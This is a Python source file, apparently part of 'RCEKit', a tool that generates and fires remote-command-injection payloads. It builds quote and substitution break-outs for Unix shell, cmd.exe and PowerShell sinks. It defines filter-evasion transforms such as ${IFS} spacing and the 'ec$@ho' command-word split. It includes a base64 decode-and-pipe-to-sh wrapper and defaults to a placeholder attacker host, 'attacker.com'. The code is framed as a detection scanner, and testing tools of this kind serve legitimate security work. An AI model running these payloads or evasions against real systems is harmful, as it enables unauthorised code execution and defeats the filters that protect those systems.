#!/usr/bin/env python3
import argparse
import base64
import json
import logging
import random
import re
import string
import struct
import sys
import urllib.parse
import zlib
from dataclasses import asdict, dataclass, field as dataclass_field, replace as dataclass_replace
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, Iterable, Iterator, List, Optional, Sequence, Set, Tuple

logger = logging.getLogger(__name__)


def configure_logging() -> None:
    """Attach RCEKit's file and stdout log handlers.

    Called from :func:`main`, never at import. Importing a module must not
    create files in the caller's working directory -- and this one did: a bare
    ``import rcekit`` wrote ``rcekit.log`` wherever the interpreter happened to
    be, because ``FileHandler`` opens its file the moment it is constructed.
    That is untenable for an installed distribution, where the module is
    imported by tooling that never intends to run a scan.

    ``basicConfig`` is a no-op once the root logger has handlers, so calling
    this twice, or calling it from a host application that configured its own
    logging, changes nothing."""
    # The file handler runs a level below the console one on purpose: detail
    # that would be noise on an operator's terminal is still worth having in
    # the log when a run has to be reconstructed afterwards.
    file_handler = logging.FileHandler("rcekit.log")
    file_handler.setLevel(logging.DEBUG)
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[file_handler, console_handler],
    )

# Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
# breaking changes to the CLI, output formats, or template schema.
__version__ = "3.1.0"

SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}

# Contexts whose break-out prefix already ends in a command separator (``'; ``,
# ``"; ``). Prepending another one yields ``'; ; cmd`` -- a shell syntax error
# that silently costs the probe. Shared by the generator and the detection
# engine: keeping it in one place is what stops the two from drifting apart,
# as they did when only the generator carried the guard.
SELF_SEPARATING_CONTEXTS = {"shell_single_quoted", "shell_double_quoted"}

# Contexts that reach the shell through *command substitution* rather than by
# breaking out of the running command. They need no separator either, but for
# the opposite reason: there is nothing to break out of. The payload is a
# substitution the shell evaluates where it sits.
#
# This is the sink shape no other context reaches. Measured against `sh -c 'echo
# PING "<input>"'`, with the app filtering one metacharacter:
#
#   filter        shell_double_quoted   shell_subshell   shell_backtick
#   strips "      inert                 EXECUTED         EXECUTED
#   strips $      EXECUTED              inert            EXECUTED
#
# So the quoted break-out and the substitution cover different filters, and the
# backtick form survives both -- which is why both substitution shapes ship
# rather than the `$( )` one alone.
SUBSTITUTION_CONTEXTS = {"shell_subshell", "shell_backtick"}

# Contexts that supply their own way into the shell, so a probe must not prepend
# a command separator to them.
NO_SEPARATOR_CONTEXTS = SELF_SEPARATING_CONTEXTS | SUBSTITUTION_CONTEXTS

# The sink-shape ladder: one name per shape the injected value can land in, in
# escalation order (cheapest and most common first). `--sink-shape` selects
# rungs; the machinery underneath is the existing separator sweep and break-out
# contexts, so naming a rung narrows an already-supported run rather than
# switching on a parallel code path.
SINK_SHAPE_RUNGS = ("sep", "raw", "chain", "newline", "dq", "sq", "subshell")

# The shell dialects a probe can be written for. `$((a+b))`, `$(echo TAG)` and
# `sleep` are POSIX constructs: on a cmd.exe or PowerShell sink they are inert
# literal text, so a probe written in one dialect and fired at another costs a
# request and can only ever come back negative.
SINK_ENVIRONMENTS = ("unix", "windows", "powershell")

# Sink dialects whose filesystem paths use a backslash and whose delete command
# is not `rm`.
WINDOWS_PATH_SINK_ENVS = frozenset({"windows", "powershell"})

# Contexts where the injected value arrives as *code* rather than as a value
# something else evaluates -- either because the context's prefix ends the
# construct the value sat in and starts a new one (`';` then a statement, `<?php`
# then a program), or because the value simply is the command.
#
# A boolean predicate needs the other kind: a wrapper the value sits inside, so
# that what the target evaluates is the comparison. `attribute`, `yaml` and
# `xml_cdata` open and close around the value and belong on the predicate side
# however elaborate their delimiters are, while `unix_shell` has no delimiters
# at all and does not -- which is why this is a declared list and not a test on
# whether the prefix is empty. That test was tried first and got both halves
# wrong: it offered the three shell dialects and refused the four wrappers.
CODE_POSITION_CONTEXTS = frozenset({
    "javascript", "sql", "php",
    "shell_single_quoted", "shell_double_quoted", "shell_subshell", "shell_backtick",
    "unix_shell", "windows_cmd", "powershell",
})

# Break-out contexts that are POSIX syntax on a Unix shell and *also* valid
# PowerShell: `'; ... #` closes the quote and comments the tail (PowerShell's
# comment character is `#` too), and `$( )` is its subexpression operator.
# Measured against pwsh 7.4. The backtick is deliberately absent: in PowerShell
# it is the escape character, not a substitution, so that context is inert.
POWERSHELL_BREAKOUT_CONTEXTS = frozenset({
    "shell_single_quoted", "shell_double_quoted", "shell_subshell",
})

# Rungs that vary the command *separator* the probe breaks out with, per sink
# dialect. A rung names the *role* ("chain the injected command onto the
# running one"); which characters fill that role is the dialect's business.
#
# cmd.exe has no line-oriented separator, so `newline` contributes nothing.
# PowerShell has no working pipe break-out: `cmd | Start-Sleep -Milliseconds N`
# is a parameter-binding error, not a fresh command with stdin attached the way
# a POSIX pipe is -- measured, and it fails the same way for every cmdlet the
# probes use. `&&`/`||` exist from PowerShell 7 only; they are kept because
# they are free when absent (a parse error on 5.1 costs the probe, not the run)
# and `;`/newline carry the common case in both.
SINK_SHAPE_SEPARATORS_BY_ENV = {
    "unix": {
        "sep": ("; ",),
        "chain": ("| ", "|| ", "&& "),
        "newline": ("\n",),
    },
    "windows": {
        "sep": (" & ",),
        "chain": (" | ", " || ", " && "),
        "newline": (),
    },
    "powershell": {
        "sep": ("; ",),
        "chain": ("&& ", "|| "),
        "newline": ("\n",),
    },
}
SINK_SHAPE_SEPARATORS = SINK_SHAPE_SEPARATORS_BY_ENV["unix"]

# Rungs that vary the *context* the probe is wrapped in, per sink dialect.
# cmd.exe has neither a comment character to swallow the sink's tail nor a
# command-substitution syntax, so none of these three rungs has a shape it can
# execute there and the carriers for them are not built at all.
SINK_SHAPE_CONTEXTS_BY_ENV = {
    "unix": {
        "sq": ("shell_single_quoted",),
        "dq": ("shell_double_quoted",),
        "subshell": ("shell_subshell", "shell_backtick"),
    },
    "windows": {},
    "powershell": {
        "sq": ("shell_single_quoted",),
        "dq": ("shell_double_quoted",),
        "subshell": ("shell_subshell",),
    },
}
SINK_SHAPE_CONTEXTS = SINK_SHAPE_CONTEXTS_BY_ENV["unix"]


# What each evasion rung does to a Unix shell probe, cheapest first. A rung is
# a trade and it was being made blind: measured shape by shape against an
# unfiltered target, `low` broke 8 probe shapes that the canonical form
# executes and improved none of them. Against a filter that blocks whitespace
# it turned 1 confirmation into 6. So the rung is worth paying for exactly
# where something was refused, and nowhere else.
EVASION_RUNGS = ("none", "low", "high")


def evade_spaces(body: str, replacement: str, opens_closed: bool = False) -> str:
    """Replace spaces *outside quotes* with ``replacement``.

    Blind replacement was a shipped defect. A probe carrying a quoted program
    -- ``awk 'BEGIN{print "RK" a+b "RK"}'`` -- had the substitution pushed
    inside the quotes, where ``${IFS}`` is literal text rather than an
    expansion, and awk was handed ``BEGIN{print${IFS}"RK"...``. Every one of
    the shapes the rung lost was this, and the loss was paid even on the
    targets where the rung is the only thing that gets through.

    Double quotes are left alone for the same reason from the other side:
    ``${IFS}`` *does* expand inside them, so substituting there would change the
    string the target computes rather than the spacing around it.

    ``opens_closed`` says the payload begins by *closing* a quote the
    application opened, which is what a break-out context is. ``'; echo ...``
    continues outside quotes, not inside them, and reading that leading quote
    as an opener left the whole body untouched -- the rung did nothing on
    exactly the contexts a filter is most likely to sit in front of."""
    out: List[str] = []
    quote: Optional[str] = None
    if opens_closed and body[:1] in "'\"":
        out.append(body[0])
        body = body[1:]
    for char in body:
        if quote:
            out.append(char)
            if char == quote:
                quote = None
            continue
        if char in "'\"":
            quote = char
            out.append(char)
            continue
        out.append(replacement if char == " " else char)
    return "".join(out)


def evade_body(body: str, rung: str, opens_closed: bool = False) -> str:
    """Apply one evasion rung to a Unix shell probe body.

    ``low`` removes whitespace, for a filter that keys on it. ``high`` also
    splits the command word with an empty expansion -- ``ec$@ho`` -- which is
    for the other measured class of filter, the one matching command names. The
    two are separate classes and a rung that only did the first left the second
    unreachable."""
    if rung == "high":
        # Before the space substitution, not after: applied afterwards the
        # split lands inside `${IFS}` and turns it into `${I$@FS}`, which is
        # neither an expansion nor a command. The canonical body is where a
        # command word is still recognisable.
        body = split_command_word(body, opens_closed=opens_closed)
    if rung in ("low", "high"):
        body = evade_spaces(body, "${IFS}", opens_closed=opens_closed)
    return body


def split_command_word(body: str, opens_closed: bool = False) -> str:
    """Break the command word with an expansion that vanishes: ``ec$@ho``.

    ``$@`` is empty in a shell with no positional parameters, so the word is
    ``echo`` to the shell and neither to a filter matching command names --
    the second class of filter the measurement turned up, and the one a
    whitespace rung leaves untouched.

    Only the command word, and only outside quotes. A quoted program is the
    target's data, not a word the shell looks up.

    ``opens_closed`` skips a leading quote that closes the application's own,
    rather than treating it as the start of the command word."""
    index = 1 if opens_closed and body[:1] in "'\"" else 0
    while index < len(body) and body[index] in ";|& \t\n":
        index += 1
    start = index
    while index < len(body) and body[index].isalpha():
        index += 1
    # At least two letters, or there is nothing to split.
    if index - start < 2:
        return body
    return body[:start + 1] + "$@" + body[start + 1:]


# The one tier that means the target executed the input. Every other tier is
# named for something else the target did, and none is ever promoted into this
# one -- which is the claim the whole tool rests on.
#
# Named here because four places compare against it: the claim sentence the
# advice prints, the head of the collapsed-verdict order, the benchmark's rule
# that a negative control may expect any tier but this one, and the
# documentation test that holds a recording's alt text to its heading. All four
# spelled it out, and this release moved what it is spelled.
EXECUTION_TIER = "executed"


def detection_question(name: str) -> str:
    """Which question a method answers, so two that answer the same one are not
    counted, budgeted or skipped as though they were separate.

    ``reflected``, ``eval``, ``file``, ``write``, ``oob``, ``time`` and
    ``boolean`` all ask *did this target execute my input* and differ only in
    how hard they look. ``lookup`` and ``deser`` ask something else entirely and
    their answers stand whatever execution turned out to be.

    Read off the class, because this used to be derived from the tier -- a set
    of tier names that counted as execution, everything else its own question.
    A tier does not determine a question and never did: ``time`` asks the
    execution question and earns a weaker answer than ``reflected`` does, while
    ``lookup`` asks a different question and earns a definitive one. Deriving
    one from the other meant that renaming a method's tier silently moved it
    out of the execution group, and out of the dedup that keeps a run from
    paying for `time`'s sleeps on a candidate `reflected` has already proven.
    Deciding it from a hand-written list of method names is the older version of
    the same mistake, and it is how `lookup` and `deser` came to be skipped for
    being expensive when what they report was never the same question."""
    return DETECTION_METHODS[name].question

# Methods whose probes are shell commands, and so ride the sink-shape ladder.
# `eval` and `write` are deliberately absent: their probes are template /
# expression syntax and file content, not shell, so no separator or quote
# break-out applies to them.
SHELL_PROBE_METHODS = {"reflected", "file", "time", "oob"}

# Methods that leave something behind on the target. Both need the operator to
# name a write path and a read-back URL, both print what they are about to do
# before doing it, and every finding they report carries a cleanup line -- so
# the list exists to keep those three obligations from drifting apart as
# methods are added.
STATE_CHANGING_METHODS = {"file", "write"}


def parse_sink_env(value: Optional[str]) -> Optional[str]:
    """``--sink-env`` -> the dialect to write every probe in, or ``None`` for
    ``auto`` (infer it per carrier).

    Raises ``ValueError`` naming the offending value, so a typo is refused
    rather than silently falling back to the POSIX shape -- which is the one
    outcome an operator who reached for this flag is trying to avoid."""
    if not value:
        return None
    value = value.strip().lower()
    if value == "auto":
        return None
    if value not in SINK_ENVIRONMENTS:
        raise ValueError(f"unknown sink environment: {value}; "
                         f"choose from auto, {', '.join(SINK_ENVIRONMENTS)}")
    return value


def observe_request(config: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    """The observed endpoint as a ready-to-fire request, or ``None``.

    One place resolves ``--observe-url`` and ``--observe-request`` so the two
    forms cannot drift: the captured-request form exists because the page a
    stored payload renders on is usually behind a login, and a URL alone cannot
    carry that session."""
    url = config.get("observe_url")
    if not url:
        return None
    return {
        "url": str(url),
        "method": config.get("observe_method") or "GET",
        "data": config.get("observe_data"),
        "headers": config.get("observe_headers"),
        "poll": config.get("observe_poll"),
        "timeout": config.get("observe_timeout"),
    }


def build_plain_request(text: str, scheme: Optional[str] = None
                        ) -> Tuple[str, str, Optional[str], List[str]]:
    """``(url, method, data, headers)`` from a raw HTTP request with **no**
    injection point.

    :func:`build_request_inputs` requires a marker because its job is to place a
    payload. The observed endpoint is the opposite: it is read, never injected
    into, so requiring a marker there would mean inventing one."""
    req = parse_raw_request(text)
    host = req["host"]
    if not host:
        raise ValueError("raw request has no Host header; cannot build an absolute URL")
    if scheme is None:
        scheme = _infer_request_scheme(host)
    headers = [f"{name}: {value}" for name, value in req["headers"]
               if name.lower() not in {"host", "content-length"}]
    return (f"{scheme}://{host}{req['target']}", req["method"],
            req["body"] or None, headers)


def _parse_name_list(value: Optional[str]) -> Optional[Tuple[str, ...]]:
    """A comma-separated name list, or ``None`` for ``auto``/unset.

    Validation of the *names* belongs where the declared set lives, so this
    only splits; the method that owns the corpus section refuses an unknown one
    by name rather than narrowing the run to nothing behind a typo."""
    if not value or value.strip().lower() == "auto":
        return None
    names = tuple(part.strip().lower() for part in value.split(",") if part.strip())
    return names or None


def parse_bridges(value: Optional[str]) -> Tuple[str, ...]:
    """``--bridges`` -> the query-language bridges to ride, or ``()`` for none.

    Off by default, and that is the design rather than caution: a bridge payload
    is SQL or XML syntax, so on an ordinary shell sink it is a request that
    cannot confirm. ``auto`` takes every bridge the corpus declares.

    Raises ``ValueError`` naming the offending value -- a typo that silently
    selected nothing would make a run that tested no bridge at all read exactly
    like one that tested them and came back clean."""
    if not value or value.strip().lower() in {"none", ""}:
        return ()
    if value.strip().lower() == "auto":
        return ("auto",)
    return tuple(part.strip().lower() for part in value.split(",") if part.strip())


def parse_write_langs(value: Optional[str]) -> Optional[Tuple[str, ...]]:
    """``--write-lang`` -> the file types to write, or ``None`` for ``auto``.

    Raises ``ValueError`` naming the offending value. A typo here would narrow
    the run to nothing and report a clean negative from a run that wrote no
    file at all."""
    if not value or value.strip().lower() == "auto":
        return None
    names = tuple(part.strip().lower() for part in value.split(",") if part.strip())
    known = set(WriteThenExecute.LANGUAGES)
    unknown = [name for name in names if name not in known]
    if unknown:
        raise ValueError(f"unknown write language(s): {', '.join(unknown)}; "
                         f"choose from auto, {', '.join(sorted(known))}")
    return names or None


def sink_env_for(record: "PayloadRecord", config: Dict[str, Any]) -> str:
    """Which shell dialect a carrier's probes must be written in.

    ``--sink-env`` is the operator stating what runs the injected command, and
    it wins outright: the corpus environment names the application runtime, not
    the OS underneath it, so a PHP or Java application on Windows is a case the
    inference below cannot see and the operator can.

    Otherwise it is derived from the carrier, and the *context* speaks first
    where it names a shell. That ordering is what makes the extra carriers built
    for a dialect stay in that dialect: a ``powershell`` carrier that grows a
    ``'; ... #`` break-out must still be judged PowerShell, and re-deriving from
    the environment alone would hand those probes to cmd.exe -- which was
    exactly the measured defect here. Every ``windows`` carrier used to take the
    cmd core, so the run's one explicitly PowerShell-shaped carrier was written
    in a dialect it cannot execute."""
    explicit = config.get("sink_env")
    if explicit:
        return str(explicit)
    if record.context == "powershell":
        return "powershell"
    if record.context == "windows_cmd":
        return "windows"
    if record.environment == "windows":
        return ("powershell" if record.context in POWERSHELL_BREAKOUT_CONTEXTS
                else "windows")
    return "unix"


def effective_sink_shapes(config: Dict[str, Any]) -> Tuple[str, ...]:
    """The rungs a run will *actually* try, after every narrowing in play.

    ``--sink-shape`` is the operator's stated choice, but four other flags
    narrow it, and the pre-flight plan is presented as an audit of the traffic
    about to be sent -- so it has to be computed from the effective state rather
    than from the raw flag, or it describes a run that will not happen.

    Single source of truth: the engine asks this too (see
    ``DetectionMethod._raw_rung_selected``), so what is printed and what is sent
    cannot drift."""
    if config.get("sink_raw"):
        return ("raw",)
    shapes = config.get("sink_shapes")
    selected = set(shapes if shapes is not None else SINK_SHAPE_RUNGS)
    if shapes is None and config.get("separators"):
        # Naming the separators is a statement that the sink is separator-led.
        selected.discard("raw")
    if config.get("contexts_explicit"):
        # An explicit --contexts suppresses the added quote/substitution
        # carriers, so those rungs never get a carrier to ride on.
        selected -= set(SINK_SHAPE_CONTEXTS)
    sink_env = config.get("sink_env")
    if sink_env:
        # A pinned dialect rules out the rungs it has no syntax for -- cmd.exe
        # has no comment character, no substitution and no line separator, so
        # printing those rungs would describe requests that will not be sent.
        # Only knowable up front when the dialect is pinned; under `auto` it is
        # a per-carrier answer.
        selected &= (set(SINK_SHAPE_CONTEXTS_BY_ENV.get(sink_env, {}))
                     | {rung for rung, seps in
                        SINK_SHAPE_SEPARATORS_BY_ENV.get(sink_env, {}).items() if seps}
                     | {"raw"})
    return tuple(rung for rung in SINK_SHAPE_RUNGS if rung in selected)


def sink_shape_plan(shapes: Optional[Tuple[str, ...]]) -> List[str]:
    """One line per rung the run will try, for the pre-flight execution plan.

    The ladder multiplies request count, so what it is about to send is stated
    before it is sent rather than inferred from the traffic afterwards."""
    selected = shapes or SINK_SHAPE_RUNGS
    described = {
        "raw": "input is the whole command (no separator)",
        "sep": "'; ' -- mid-command concatenation",
        "chain": "'| ', '|| ', '&& ' -- pipes and conditional chains",
        "newline": "newline -- line-oriented sinks (CGI, config writers)",
        "sq": "\"'; ... #\" -- value inside single quotes",
        "dq": "'\"; ... #' -- value inside double quotes",
        "subshell": "'$(...)' and backticks -- substitution inside a quoted string",
    }
    return [f"[detect]   {rung:<9} {described[rung]}"
            for rung in SINK_SHAPE_RUNGS if rung in selected]


def parse_sink_shapes(value: Optional[str]) -> Optional[Tuple[str, ...]]:
    """``--sink-shape`` -> the rungs to try, or ``None`` for the whole ladder.

    Raises ``ValueError`` naming the offending rung, so a typo is refused rather
    than silently narrowing the run to nothing."""
    if not value or value == "auto":
        return None
    rungs = tuple(part.strip() for part in value.split(",") if part.strip())
    unknown = [rung for rung in rungs if rung not in SINK_SHAPE_RUNGS]
    if unknown:
        raise ValueError(f"unknown sink shape(s): {', '.join(unknown)}; "
                         f"choose from auto, {', '.join(SINK_SHAPE_RUNGS)}")
    if not rungs:
        return None
    return rungs


# The ceiling on a decompressed response body. A target is untrusted by
# definition -- it is the thing being tested -- and compression is the one place
# where it decides how much memory RCEKit allocates. Measured here: 203,860
# bytes of gzip hold 200 MB of zeros, a ratio of 1:1028, and this path runs once
# per probe. The oracle is looking for a short computed value, so a body past
# this is not a detection channel that was missed; it is a small reply expanding
# into the scanner.
MAX_DECOMPRESSED_BODY = 32 * 1024 * 1024


def _inflate_bounded(raw: bytes, wbits: int) -> Tuple[bytes, bool]:
    """Decompress ``raw`` to at most :data:`MAX_DECOMPRESSED_BODY` bytes.

    Returns ``(body, truncated)``. Whatever was produced before the ceiling is
    kept rather than discarded: the value the oracle wants is short and near
    where the target wrote it, so searching 32 MB is a far better answer than
    searching nothing, and the only risk the ceiling carries is a false
    negative -- never a false ``executed``.

    Multi-member streams are followed, because ``gzip.decompress`` followed them
    and a ceiling must not quietly become a truncation for a server that
    concatenates members."""
    out = bytearray()
    data = raw
    while data and len(out) < MAX_DECOMPRESSED_BODY:
        obj = zlib.decompressobj(wbits=wbits)
        out += obj.decompress(data, MAX_DECOMPRESSED_BODY - len(out))
        if obj.unconsumed_tail:
            return bytes(out), True      # the ceiling stopped us mid-member
        if not obj.eof:
            break                        # stream ended early; keep what parsed
        nxt = obj.unused_data
        if nxt == data:
            break                        # no progress; never spin on it
        data = nxt
    return bytes(out), False


def decode_response_body(raw: bytes, content_encoding: Optional[str]) -> str:
    """A response body as text, decompressed first when the server encoded it.

    Every in-band oracle -- ``reflected``, ``eval``, ``file``, ``write``,
    ``boolean`` -- reads the body looking for a value the target computed. A
    compressed body is bytes that contain that value and do not *spell* it, so
    without this the oracle searches gzip's output for a decimal number and
    reports ``negative`` on a target that executed the probe. Measured against
    Apache HugeGraph 1.2.0, which returns ``Content-Encoding: gzip`` on its 200s
    (its error responses are plain, which is why the same run confirmed through
    a 400 and missed the 200 that carried the real execution).

    The header is honoured whether or not RCEKit asked for it: a server may
    compress unprompted, and this one does -- it gzips a response to a request
    that sent no ``Accept-Encoding`` at all.

    Only what the standard library can undo. ``br`` and ``zstd`` need a
    third-party module, and this tool has no dependencies to add one to; a body
    in either comes back as its raw bytes rather than as an exception, so the
    run continues and reports ``negative`` for that probe alone.

    Bounded, at :data:`MAX_DECOMPRESSED_BODY` per step. Expansion is the one
    resource the target gets to choose, and one-shot decompression handed it a
    blank cheque.

    Never raises. A body that claims an encoding and is not in it -- truncated,
    mislabelled, or already decoded by something upstream -- is returned
    undecompressed, because one malformed response must not end a run that has
    already spent hundreds of probes."""
    name = (content_encoding or "").strip().lower()
    truncated = False
    # A proxy chain may stack them ("gzip, gzip"); the last applied is undone
    # first, which is the order this walks.
    for step in reversed([part.strip() for part in name.split(",") if part.strip()]):
        try:
            if step == "gzip" or step == "x-gzip":
                raw, truncated = _inflate_bounded(raw, 16 + zlib.MAX_WBITS)
            elif step == "deflate":
                # Two things ship under this name: a raw deflate stream and a
                # zlib-wrapped one. Servers disagree, so try the wrapper first
                # and fall back rather than guess from the header.
                try:
                    raw, truncated = _inflate_bounded(raw, zlib.MAX_WBITS)
                except zlib.error:
                    raw, truncated = _inflate_bounded(raw, -zlib.MAX_WBITS)
            elif step in ("identity", ""):
                continue
            else:
                break
        except Exception:
            break
        if truncated:
            # Stop here rather than inflate the next layer of something already
            # at the ceiling, and say so: a body cut short is a body the oracle
            # searched only part of, and that must not pass for a clean read.
            logging.warning(
                "response body hit the %d-byte decompression ceiling and was truncated; "
                "a negative verdict on this probe was decided on a partial body",
                MAX_DECOMPRESSED_BODY)
            break
    return raw.decode(errors="replace")


@dataclass(frozen=True)
class PayloadRecord:
    payload: str
    mode: str
    category: str
    environment: str
    context: str
    encoding: str
    sink: Optional[str]
    indicator: str
    safety: str
    expected_channel: str
    runner: Optional[str]
    tags: Tuple[str, ...] = ()
    notes: Tuple[str, ...] = ()
    blocking: bool = False
    stateful: bool = False
    destructive: bool = False
    separator_led: bool = True
    token: Optional[str] = None
    oob_host: Optional[str] = None
    match: Optional[str] = None
    expected_delay_ms: Optional[int] = None

class RCEKit:
    def __init__(
        self,
        attacker_ip: str = "192.168.1.100",
        attacker_domain: str = "attacker.com",
        template_path: Optional[Path] = None,
    ):
        self.attacker_ip = attacker_ip
        self.attacker_domain = attacker_domain
        # An explicit --template-file is authoritative: it never falls back to the
        # built-in corpus, so "I pointed at my corpus" always means what it says.
        self.template_explicit = template_path is not None
        self.template_path = template_path or Path(__file__).parent / "templates" / "payloads.json"
        # Which corpus actually loaded, for --doctor and the fallback notice.
        self.corpus_source: str = str(self.template_path)
        # How many detection probes the operator's *declared* target profile
        # removed, and why. Tallied across every wave and injection point of a
        # run and read once by the caller. A ladder that silently shrinks is the
        # one failure this filter could introduce -- it would turn the operator's
        # own description of the target into a source of false negatives -- so
        # the removal is reported, never assumed.
        self.profile_dropped_probes = 0
        self.profile_drop_reasons: Dict[str, int] = {}
        # Counted apart from the profile drops: a probe held back here could
        # have reached the sink, and saying otherwise would be a false
        # statement about the run.
        self.safety_held_probes = 0
        self.safety_held_reasons: Dict[str, int] = {}
        # And apart again from the shapes that went *past* the tier because
        # their effect is one a notice undoes. Those are not held back; they
        # are disclosed.
        self.reach_noted_probes = 0
        self.reach_notes: Dict[str, int] = {}
        # And apart once more from the shapes not sent because the carrier they
        # belong to had already confirmed. A fourth number rather than a fourth
        # meaning for one of the others: this says the probe *could* have been
        # sent and there was nothing left for it to establish, which is neither
        # "could not reach the sink" nor "the operator declined the risk".
        self.settled_probes = 0
        self.settled_carriers: Dict[str, int] = {}
        # And a fifth, for probes a filter refused. Not a profile drop (they
        # were sent), not a safety hold (nothing declined them), not a settled
        # carrier (nothing was established) -- they arrived at something that
        # was not the sink.
        self.refused_probes = 0
        self.refused_statuses: Dict[int, int] = {}
        # And a sixth, for a series the request budget could not pay for. Not a
        # profile drop, not a safety hold, not a settled carrier, not a
        # refusal: the method applied, the operator allowed it, and there were
        # not enough requests left to reach any verdict but a wrong one. Named
        # rather than silent, because a run that quietly tested less than it
        # said reads exactly like a target with less to find.
        self.budget_held_series = 0
        self.budget_held_reasons: Dict[str, int] = {}
        # Retries a refusal bought, and the ones that got through. Reported,
        # because extra traffic the operator did not ask for has to be visible
        # -- and because a rung that never converts anything is one to stop
        # climbing to.
        self.escalated_probes = 0
        self.escalation_wins: Dict[str, int] = {}
        # Requests that actually went out, which is not len(results): an
        # aggregate method fires a whole ladder and reports one row, so a
        # refusal count drawn from rows and a status tally drawn from requests
        # describe the same run with different arithmetic.
        self.delivered_probes = 0
        self.setup_components()

    def setup_components(self):
        """Initialize all payload components"""
        # Injection contexts. Each context has a break-out `prefix`/`suffix` and,
        # crucially, an `escape` rule describing how the payload must be encoded to
        # remain valid *inside* the surrounding container. Two families:
        #   * language / structural break-outs (close a quote, tag, or statement)
        #   * transport / serialization contexts that carry any environment's
        #     payload and only need to survive the wire format (JSON/XML/YAML/...)
        self.contexts = {
            # Language & structural break-outs
            "raw": {"prefix": "", "suffix": "", "escape": "none"},
            "html": {"prefix": "", "suffix": "", "escape": "none"},
            "attribute": {"prefix": "\"", "suffix": "\"", "escape": "none"},
            "attribute_unquoted": {"prefix": " ", "suffix": " ", "escape": "none"},
            "javascript": {"prefix": "';", "suffix": ";//", "escape": "none"},
            "sql": {"prefix": "';", "suffix": "-- ", "escape": "none"},
            "php": {"prefix": "<?php ", "suffix": "?>", "escape": "none"},
            "unix_shell": {"prefix": "", "suffix": "", "escape": "none"},
            "windows_cmd": {"prefix": "", "suffix": "", "escape": "none"},
            "powershell": {"prefix": "", "suffix": "", "escape": "none"},
            "shell_single_quoted": {"prefix": "'; ", "suffix": " #", "escape": "none"},
            "shell_double_quoted": {"prefix": "\"; ", "suffix": " #", "escape": "none"},
            # Command substitution: runs where it sits, so it reaches a
            # double-quoted sink without closing the quote (see
            # SUBSTITUTION_CONTEXTS). Both forms ship because they survive
            # different filters.
            "shell_subshell": {"prefix": "$(", "suffix": ")", "escape": "none"},
            "shell_backtick": {"prefix": "`", "suffix": "`", "escape": "none"},
            "graphql_string": {"prefix": "", "suffix": "", "escape": "graphql"},
            # Transport / serialization contexts (carry any environment's payload)
            "json": {"prefix": "", "suffix": "", "escape": "json"},
            "graphql_variable": {"prefix": "", "suffix": "", "escape": "json"},
            "xml": {"prefix": "", "suffix": "", "escape": "xml"},
            "xml_cdata": {"prefix": "<![CDATA[", "suffix": "]]>", "escape": "none"},
            "yaml": {"prefix": "\"", "suffix": "\"", "escape": "json"},
            "http_header": {"prefix": "", "suffix": "", "escape": "header"},
        }
        # Contexts that deliver any payload through a serialization layer; they are
        # compatible with every environment, not just shell runners.
        self.transport_contexts = {"json", "graphql_variable", "graphql_string", "xml", "xml_cdata", "yaml", "http_header"}
        # Original language/structural contexts used when no --contexts is given,
        # so default output size and behaviour stay stable; the richer contexts
        # above are opt-in via --contexts.
        self.default_contexts = ["raw", "html", "attribute", "javascript", "sql", "php", "unix_shell", "windows_cmd", "powershell"]
        self.separator_envs = {"unix", "windows", "docker", "kubernetes"}
        # Command chainers that break out of a concatenated shell command. Used by
        # sink-aware profiles (sink_needs_separator) to keep only payloads that can
        # actually escape a mid-command injection point. ${IFS} is deliberately not
        # here: it is a field separator, not a command separator.
        self.command_separators = ("; ", "| ", "|| ", "& ", "&& ", "&", "|",
                                   "%0a", "%0A", "%26", "%7C", "`|", "`&", "\\n", "\n")
        self.safe_detection_encodings = ["none", "url_encode", "double_url_encode"]
        # Runners whose target parser is case-insensitive, so random_case is a
        # meaningful keyword/WAF-bypass transform rather than a payload-breaking one.
        self.case_insensitive_runners = {"cmd", "powershell", "sql"}

        # Command separators and chainers for different environments
        self.separators = {
            "unix": ["; ", "| ", "|| ", "& ", "&& ", "%0a", "%0A", "${IFS}", "\\n"],
            "windows": ["&", "|", "%26", "%7C", "`|", "`&"],
            "docker": ["; ", "&& ", "| "],
            "kubernetes": ["; ", "&& "],
        }

        self.payload_categories: Dict[str, Any] = {}
        self.detection_payloads: Dict[str, List[str]] = {}
        # Engine-specific wrappers for the `eval` arithmetic probe, declared in
        # the corpus so coverage can be extended without touching Python.
        self.eval_carriers: Dict[str, Dict[str, Any]] = {}
        # Query-language carriers that hand a shell command to the OS. Declared
        # in the corpus for the same reason eval_carriers are: coverage grows
        # without touching Python.
        self.bridges: Dict[str, Dict[str, Any]] = {}
        # Format probes for the deserialization-sink method, declared in the
        # corpus so an ecosystem can be added without touching Python.
        self.deser_probes: Dict[str, Dict[str, Any]] = {}
        self._load_template_payloads()

        # Encoding and obfuscation techniques.
        #
        # Every transform here must yield something an operator can actually run
        # against the target. Two classes are intentionally excluded:
        #   * Transport encodings that the channel decodes before the sink
        #     (url/double-url) and decoder-paired blobs (base64/hex variants,
        #     which carry an explicit "needs a decode-and-execute path" note).
        #   * random_case, which only survives on case-insensitive parsers and
        #     is gated per-runner in _encoding_is_compatible.
        #
        # Removed (previously emitted non-executable noise): rot13,
        # rot13_then_base64, insert_special_chars, xor_polymorphic, chunk_shuffle.
        # e.g. rot13("id") -> "vq" (runs nothing), xor/shuffle emitted literal
        # "XOR(..):"/"shuffle::" debug strings, and insert_special_chars spliced
        # raw %0a bytes into live shell commands.
        self.encoding_methods = {
            "none": lambda x: x,
            "url_encode": lambda x: urllib.parse.quote(x),
            "double_url_encode": lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            "random_case": lambda x: ''.join(random.choice([c.upper(), c.lower()]) for c in x),
            # Self-contained: carries its own decoder, so it runs as-is on a shell.
            "base64_decode_exec": lambda x: f"echo {base64.b64encode(x.encode()).decode()}|base64 -d|sh",
            # Bare blobs: only work where the *sink* base64/hex-decodes the input.
            # Opt-in, and never in the default set, so plain-text output cannot be
            # copied as a payload that silently does nothing on the target.
            "base64": lambda x: base64.b64encode(x.encode()).decode(),
            "hex": lambda x: x.encode().hex(),
            "base64_then_url": lambda x: urllib.parse.quote(base64.b64encode(x.encode()).decode()),
